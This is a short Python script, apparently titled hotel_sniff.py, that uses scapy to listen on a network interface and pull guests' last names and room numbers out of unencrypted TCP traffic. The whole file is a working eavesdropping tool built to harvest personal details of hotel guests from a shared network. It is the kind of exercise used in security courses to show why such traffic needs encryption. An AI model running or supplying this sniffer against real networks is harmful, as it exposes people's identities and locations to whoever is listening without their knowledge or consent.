import re
import argparse
from scapy.all import sniff, conf


def find_guest(pkt):
    raw = pkt.sprintf('%Raw.load%')
    name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print(f'[+] Found Hotel Guest {str(name[0])}, Room # {str(room[0])}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 hotel_sniff.py INTERFACE')
    parser.add_argument('iface', type=str, metavar='INTERFACE',
                        help='specify the interface to listen on')
    args = parser.parse_args()
    conf.iface = args.iface

    try:
        print('[*] Starting Hotel Guest Sniffer.')
        sniff(filter='tcp', prn=find_guest, store=0)
    except KeyboardInterrupt:
        exit(0)
